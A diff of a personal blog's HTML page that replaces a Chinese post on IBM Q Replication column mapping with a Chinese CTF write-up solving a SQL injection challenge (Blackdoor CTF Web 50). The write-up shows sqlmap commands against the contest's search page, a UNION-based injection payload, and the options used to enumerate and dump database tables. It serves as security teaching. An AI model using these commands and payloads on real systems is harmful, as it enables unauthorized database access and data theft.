@@ -5,12 +5,11 @@
 <!--[if (gt IE 8)|(gt IEMobile 7)|!(IEMobile)|!(IE)]><!--><html class="no-js" lang="en"><!--<![endif]-->
 <head>
   <meta charset="utf-8">
-  <title>Q Replication Column Mapping - On My Way.</title>
+  <title>Blackdoor CTF Web 50 - On My Way.</title>
   <meta name="author" content="pollucite">
 
   
-  <meta name="description" content="寫起來當個紀錄。 這兩天工作的時候碰到 Q replication 從上游流到下游的時候有 column 對應錯誤。 Capture Apply A ---&gt; A B ---&gt; C C ---&gt; B D ---&gt; D 大概就是這樣一個情形。
-檢查 Apply 端的 &hellip;">
+  <meta name="description" content="SQL injection 基礎題，下收 sqlmap 基本用法。 題目: 是個搜尋介面，隨便打個字串&hellip; 看起來像是 SQL injection，多 try 幾次: Hmm, 說來慚愧，其實我 sql injection 直接硬打實在不是很熟，直接上 sqlmap sqlmap -u &hellip;">
   
 
   <!-- http://t.co/dKP3o1e -->
@@ -19,7 +18,7 @@
   <meta name="viewport" content="width=device-width, initial-scale=1">
 
   
-  <link rel="canonical" href="http://pollucite.github.io/blog/2014/03/13/q-replication-col-mappping">
+  <link rel="canonical" href="http://pollucite.github.io/blog/2014/03/25/blackdoor-web-50">
   <link href="/favicon.png" rel="icon">
   <link href="/stylesheets/screen.css" media="screen, projection" rel="stylesheet" type="text/css">
   <link href="/atom.xml" rel="alternate" title="On My Way." type="application/atom+xml">
@@ -69,7 +68,7 @@
   
   <header>
     
-      <h1 class="entry-title">Q Replication Column Mapping</h1>
+      <h1 class="entry-title">Blackdoor CTF Web 50</h1>
     
     
       <p class="meta">
@@ -85,7 +84,7 @@
   
 
 
-<time datetime="2014-03-13T17:08:34+08:00" pubdate data-updated="true">Mar 13<span>th</span>, 2014</time>
+<time datetime="2014-03-25T23:11:59+08:00" pubdate data-updated="true">Mar 25<span>th</span>, 2014</time>
         
            | <a href="#disqus_thread"
              data-disqus-identifier="http://pollucite.github.io">Comments</a>
@@ -95,102 +94,70 @@
   </header>
 
 
-<div class="entry-content"><p>寫起來當個紀錄。</p>
-
-<p>這兩天工作的時候碰到 Q replication 從上游流到下游的時候有 column 對應錯誤。</p>
-
-<pre><code>Capture  Apply
-   A ---&gt; A
-   B ---&gt; C
-   C ---&gt; B
-   D ---&gt; D
-</code></pre>
-
-<p>大概就是這樣一個情形。
-檢查 Apply 端的 <code>IBMQREP_TRG_COLS</code> 看到 <code>SOURCE_COLNAME</code> 與 <code>TARGET_COLNAME</code> 的對應相當正常。</p>
-
-<p>後來才發現 Q replication 是以 <code>SRC_COL_MAP</code> 這個欄位來決定上下游 column 的 mapping。</p>
+<div class="entry-content"><p>SQL injection 基礎題，下收 sqlmap 基本用法。</p>
 
 <!-- more -->
 
 
-<h2>IBMQREP_TRG_COLS 中幾個欄位的定義</h2>
+<p>題目:</p>
 
-<p>看了下 Information Center, <code>SOURCE_COLNAME</code> 可能有以下三類情形:</p>
+<p><img src="/images/2014-03-25-backdoor-web-50/web-50-question-0.PNG" alt="2014 blackdoor CTF web 10 question" />
+<img src="/images/2014-03-25-backdoor-web-50/web-50-question.PNG" alt="2014 blackdoor CTF web 10 question" /></p>
 
-<pre><code>1. 被訂閱的 source column 名稱
-2. 用來初始化 target column 值的 SQL expression (即 replication 自行加入的值)
-3. An auditing column in a consistent-change-data (CCD) tables
+<p>是個搜尋介面，隨便打個字串&hellip;</p>
+
+<p><img src="/images/2014-03-25-backdoor-web-50/web-50-answer-0.PNG" alt="2014 blackdoor CTF web 10 question" /></p>
+
+<p>看起來像是 SQL injection，多 try 幾次:</p>
+
+<p><img src="/images/2014-03-25-backdoor-web-50/web-50-answer-1.PNG" alt="2014 blackdoor CTF web 10 question" /></p>
+
+<p>Hmm, 說來慚愧，其實我 sql injection 直接硬打實在不是很熟，直接上 sqlmap</p>
+
+<pre><code>sqlmap -u http://backdoor.cognizance.org.in/problems/web50/search.php \
+       --data='search="12"'
 </code></pre>
 
-<p>第三點就不是很懂在做什麼了。</p>
+<p>sqlmap 的基本用法:</p>
 
-<p>由於 replication 不只會抄寫到 table, 也可能會把值丟給 stored procedure，所以 <code>TARGET_COLNAME</code> 同時會包含下游的名稱與參數。</p>
-
-<p><code>SRC_COL_MAP</code> 是這麼被描述的:</p>
-
-<p>The column position, data type, length, and code page for all of the columns that are used in an SQL expression.</p>
-
-<p>實際內容長得像這樣:</p>
-
-<pre><code>448,64,850,0,1;448,64,850,0,1;
+<pre><code> -u : 指定 target URL
+ --data: 指定可以 injection 的參數
 </code></pre>
 
-<h2>如何改變 column 的對應?</h2>
+<p>成功的話會吐出如何 injection 的 payload</p>
 
-<p>清掉 IBMQREP_TRG_COLS 裡面錯誤 mapping 的 <code>SRC_COL_MAP</code> ，然後 REINIT。</p>
-
-<p>這個動作不用重新啟動 replication。</p>
-
-<h3>Clear Wrong Config</h3>
-
-<p>雖然說應該只要清掉 <code>SRC_COL_MAP</code> 即可，不過之前處理的時候為了保險起見就全部清掉了</p>
-
-<pre><code>UPDATE schema.IBMQREP_TRG_COLS SET
-    MSG_COL_CODEPAGE=null,
-    MSG_COL_NUMBER=null,
-    MSG_COL_TYPE=null,
-    MSG_COL_LENGTH=null,
-    SRC_COL_MAP=null,
-    BEF_TARG_COL_NAME=null
-WHERE ...
+<pre><code>sqlmap identified the following injection points with a total of 0 HTTP(s) 
+requests:
+---
+Place: POST
+Parameter: search
+Type: UNION query
+Title: MySQL UNION query (NULL) - 1 to 10 columns
+Payload: search=a') UNION ALL SELECT NULL, NULL, CONCAT(CHAR(58,118,119,122,58)
+    ,CHAR(89,118,81,114,79,117,87,111,120,104),CHAR(58,105,115,101,58))# AND ('
+    IqLA'='IqLA
+---
 </code></pre>
 
-<h3>Reinitial Sub</h3>
+<p>接下來 dump DB, table, 各種隨意</p>
 
-<p>REINIT_SUB 這個 signal 會讓 replication 重讀 IBMQREP_SUBS &amp; IBMQREP_SRC_COLS &amp; IBMQREP_SENDQUEUES ，吃最新的設定值。</p>
-
-<pre><code>insert into schema.IBMQREP_SIGNAL(
-     SIGNAL_TIME,
-     SIGNAL_TYPE,
-     SIGNAL_SUBTYPE,
-     SIGNAL_INPUT_IN,
-     SIGNAL_STATE
- ) values (
-      CURRENT TIMESTAMP,
-     'CMD',
-     'REINIT_SUB',
-     'subname',
-     'P' );
+<pre><code>--dbs:   列出這台機器上有跑的資料庫
+--table: 列出這個資料庫裡面的 tables
+-D:      指定現在要使用的資料庫
+-T:      指定現在要使用的 table
+--dump:  取得裡面的資料
 </code></pre>
 
-<p><code>SIGNAL_STATE</code> 會有幾個狀態</p>
+<p>用 &mdash;dbs &amp; &mdash;table 找出 flag 藏身之處，再 dump 出來:</p>
 
-<pre><code>P: Default 值，pending，表示 Q Capture 尚未收到這個 signal
-R: Receive
-C: Completed process
-F: Fail
+<pre><code> sqlmap -u http://backdoor.cognizance.org.in/problems/web50/search.php \
+        --data='search="12"' \
+        -D sqli_db \
+        -T the_flag_is_over_here \
+        --dump
 </code></pre>
 
-<p>REINIT 後過一會子，檢查 <code>IBMQREP_TRG_COLS</code> 設定有吃進去之後應該就好了。</p>
-
-<h2>Reference</h2>
-
-<ol>
-<li><a href="https://publib.boulder.ibm.com/infocenter/db2luw/v9/topic/com.ibm.websphere.ii.replication.qrepl.doc/reference/iiyrqctbrapplist.html">Information Center: Control tables at the Q Apply server</a></li>
-<li><a href="http://publib.boulder.ibm.com/infocenter/db2luw/v9r5/topic/com.ibm.swg.im.iis.repl.qrepl.doc/topics/iiyrqsubcchgovew.html">Information Center: Changing the properties of unidirectional Q subscriptions</a></li>
-</ol>
-
+<p>大概就是這樣囉。</p>
 </div>
 
 
@@ -213,12 +180,12 @@ F: Fail
   
 
 
-<time datetime="2014-03-13T17:08:34+08:00" pubdate data-updated="true">Mar 13<span>th</span>, 2014</time>
+<time datetime="2014-03-25T23:11:59+08:00" pubdate data-updated="true">Mar 25<span>th</span>, 2014</time>
       
 
 <span class="categories">
   
-    <a class='category' href='/blog/categories/q-replication/'>Q replication</a>
+    <a class='category' href='/blog/categories/ctf/'>CTF</a>, <a class='category' href='/blog/categories/web/'>Web</a>, <a class='category' href='/blog/categories/blackdoor-2014/'>blackdoor 2014</a>
   
 </span>
 
@@ -227,7 +194,7 @@ F: Fail
     
       <div class="sharing">
   
-  <a href="//twitter.com/share" class="twitter-share-button" data-url="http://pollucite.github.io/blog/2014/03/13/q-replication-col-mappping/" data-via="" data-counturl="http://pollucite.github.io/blog/2014/03/13/q-replication-col-mappping/" >Tweet</a>
+  <a href="//twitter.com/share" class="twitter-share-button" data-url="http://pollucite.github.io/blog/2014/03/25/blackdoor-web-50/" data-via="" data-counturl="http://pollucite.github.io/blog/2014/03/25/blackdoor-web-50/" >Tweet</a>
   
   
   
@@ -236,8 +203,8 @@ F: Fail
     
     <p class="meta">
       
+        <a class="basic-alignment left" href="/blog/2014/03/23/blackdoor-web-10-and-30/" title="Previous Post: backdoor CTF Web 10 and 30">&laquo; backdoor CTF Web 10 and 30</a>
       
-        <a class="basic-alignment right" href="/blog/2014/03/17/problem-detecting-on-q-replication/" title="Next Post: Q Replication - 一些 PD 技巧">Q Replication - 一些 PD 技巧 &raquo;</a>
       
     </p>
   </footer>
@@ -320,8 +287,8 @@ F: Fail
       
         
         // var disqus_developer = 1;
-        var disqus_identifier = 'http://pollucite.github.io/blog/2014/03/13/q-replication-col-mappping/';
-        var disqus_url = 'http://pollucite.github.io/blog/2014/03/13/q-replication-col-mappping/';
+        var disqus_identifier = 'http://pollucite.github.io/blog/2014/03/25/blackdoor-web-50/';
+        var disqus_url = 'http://pollucite.github.io/blog/2014/03/25/blackdoor-web-50/';
         var disqus_script = 'embed.js';
       
     (function () {
